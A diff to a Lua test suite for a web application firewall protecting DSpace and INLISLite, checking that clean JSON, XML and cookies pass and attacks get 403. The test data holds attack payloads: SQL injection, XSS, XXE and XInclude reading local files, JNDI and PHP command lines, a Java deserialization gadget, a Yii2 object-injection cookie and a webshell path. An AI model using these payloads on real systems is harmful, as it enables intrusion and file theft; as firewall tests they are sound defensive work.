@@ -48,6 +48,21 @@ local temps = {}
 local EXIT = {}
 package.loaded["waf_ban_cache"] = {}
 
+local function re_find(s, p)
+	if p:find("MATCHLIMIT", 1, true) and s:find("boom", 1, true) then
+		return nil, nil, "pcre2_match() failed: -47"
+	end
+	if p:find("doctype", 1, true) then
+		for _, w in ipairs({ "<!doctype", "<!entity", "class=", "<?php", "${jndi", "<script" }) do
+			if s:lower():find(w, 1, true) then
+				return 1
+			end
+		end
+		return nil
+	end
+	return s:lower():find((p:gsub("%(%?i%)", ""):gsub("\\%.", "%%."):lower()))
+end
+
 local function run()
 	local ok, err = pcall(dofile, script)
 	if not ok and err ~= EXIT then
@@ -75,19 +90,8 @@ local function start(ip, opts)
 				content_length = opts.body and not opts.chunked and tostring(#opts.body) or nil,
 			},
 			re = {
-				find = function(s, p)
-					if p:find("MATCHLIMIT", 1, true) and s:find("boom", 1, true) then
-						return nil, nil, "pcre2_match() failed: -47"
-					end
-					if p:find("doctype", 1, true) then
-						for _, w in ipairs({ "<!doctype", "<!entity", "class=", "<?php", "${jndi", "<script" }) do
-							if s:lower():find(w, 1, true) then
-								return 1
-							end
-						end
-						return nil
-					end
-					return s:lower():find((p:gsub("%(%?i%)", ""):gsub("\\%.", "%%."):lower()))
+				find = function(...)
+					return re_find(...)
 				end,
 			},
 			decode_args = function(s, max)
@@ -680,6 +684,114 @@ check(
 localized_global.WAF_cookie_block = false
 check(request("198.51.100.217", { cookie = "q=union" }) == 200, "cookie log-only mode must not block")
 localized_global.WAF_cookie_block = true
+
+local function hex(s)
+	return (s:gsub(".", function(c)
+		return string.format("%02x", c:byte())
+	end))
+end
+local function urlencode(s)
+	return (s:gsub("[^%w]", function(c)
+		return string.format("%%%02X", c:byte())
+	end))
+end
+local fifo = os.tmpname()
+os.remove(fifo)
+assert(os.execute("mkfifo " .. fifo))
+local perl_in = assert(
+	io.popen(
+		[[perl -e '$| = 1; my %c; while (<STDIN>) { chomp; my ($r, $s, $f) = map { pack "H*", $_ } split /\t/, $_, -1; my $mod = join "", grep { index($f, $_) >= 0 } qw(i s); my $m = eval { $c{"$mod $r"} //= length $mod ? qr/(?$mod)$r/ : qr/$r/; $s =~ $c{"$mod $r"} ? 1 : 0 }; print defined $m ? $m : "E", "\n" }' > ]]
+			.. fifo,
+		"w"
+	)
+)
+local perl_out = assert(io.open(fifo, "r"))
+local memo = {}
+re_find = function(s, p, flags)
+	local k = (flags or "") .. "\0" .. p .. "\0" .. s
+	if not memo[k] then
+		perl_in:write(hex(p), "\t", hex(s), "\t", hex(flags or ""), "\n")
+		perl_in:flush()
+		memo[k] = perl_out:read("l")
+	end
+	if memo[k] == "E" then
+		return nil, nil, "perl could not compile the regex"
+	end
+	return memo[k] == "1" and 1 or nil
+end
+_G.ngx = nil
+localized_global = nil
+dofile(script:gsub("waf%-ban%.lua$", "waf-local-overrides.lua"))
+localized_global.WAF_body_block = true
+localized_global.WAF_cookie_block = true
+local json = "application/json"
+local hmac = ("4b9e1a2f"):rep(8)
+check(body({
+	ctype = "application/json-patch+json",
+	uri = "/server/api/submission/workspaceitems/12",
+	body = [=[[{"op":"add","path":"/sections/traditionalpageone/dc.title","value":[{"value":"Teachers' and true friends"}]},{"op":"add","path":"/sections/traditionalpageone/dc.identifier.uri","value":[{"value":"https://doi.org/10.1234/5678"}]}]]=],
+}) == 200, "real rules: a clean DSpace JSON Patch body must pass")
+check(body({
+	ctype = json,
+	body = [[{"color":"#ffffff","path":"C:\\users\\nina","title":"Report \"A\"; part 1 -- draft","comment":"/* draft */"}]],
+}) == 200, "real rules: clean JSON with a color, a Windows path, quotes, and comment marks must pass")
+check(
+	body({ ctype = json, body = [[{"q":"1\fUNION\fSELECT\f1,2"}]] }) == 403,
+	"real rules: \\f-separated SQLi must get 403"
+)
+check(
+	body({ ctype = json, body = [[{"bio":"<svg\fonload=alert(1)>"}]] }) == 403,
+	"real rules: \\f-separated XSS must get 403"
+)
+check(
+	body({ ctype = json, body = [[{"1' UNION SELECT 1,2-- -":{}}]] }) == 403,
+	"real rules: SQLi in an outer JSON key must get 403"
+)
+check(
+	body({ ctype = json, body = [[{"order.by":"(CASE WHEN 1=1 THEN a ELSE b END)"}]] }) == 403,
+	"real rules: the sort parameter rule must apply to a JSON key"
+)
+check(body({
+	ctype = "application/atom+xml",
+	body = '<entry xmlns="http://www.w3.org/2005/Atom"><link href="https://example.org/1"/><source><title>ok</title></source></entry>',
+}) == 200, "real rules: valid SWORDv2 Atom XML must pass")
+check(body({
+	ctype = "application/soap+xml",
+	body = '<soap:Envelope><soap:Body><item online="true"/></soap:Body></soap:Envelope>',
+}) == 200, "real rules: valid SOAP XML must pass")
+for _, xml in ipairs({
+	'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:/opt/dspace/config/local.cfg">]><a/>',
+	'<java class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"/></java>',
+	'<a xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></a>',
+	"<a>${jndi:ldap://x/a}</a>",
+	"<a><?php system('id'); ?></a>",
+}) do
+	check(body({ ctype = "text/xml", body = xml }) == 403, "real rules: an XML attack must get 403: " .. xml)
+end
+check(request("198.51.100.230", {
+	cookie = "_csrf="
+		.. urlencode(hmac .. 'a:2:{i:0;s:5:"_csrf";i:1;s:32:"abcdefghijklmnopqrstuvwxyz012345";}')
+		.. "; sl-session=5Or3==",
+}) == 200, "real rules: an INLISLite Yii2 signed _csrf cookie must pass")
+check(
+	request("198.51.100.231", { cookie = "_csrf=" .. urlencode(hmac .. 'O:23:"yii\\db\\BatchQueryResult":1:{}') })
+		== 403,
+	"real rules: a Yii2 HMAC-prefixed PHP object cookie must get 403"
+)
+check(
+	request(
+		"198.51.100.232",
+		{ raw = "/uploaded_files/foto_anggota/shell%2ephp", uri = "/uploaded_files/foto_anggota/shell.php" }
+	) == 403,
+	"real rules: a decoded INLISLite upload webshell path must get 403"
+)
+check(
+	body({ ctype = mp, body = pdf .. part(field_q, "Teachers' and true friends") .. "--XyZ--\r\n", file = true }) == 200,
+	"real rules: a clean field after a 200 KB upload must pass"
+)
+perl_in:close()
+perl_out:close()
+os.remove(fifo)
 
 for _, path in ipairs(temps) do
 	os.remove(path)
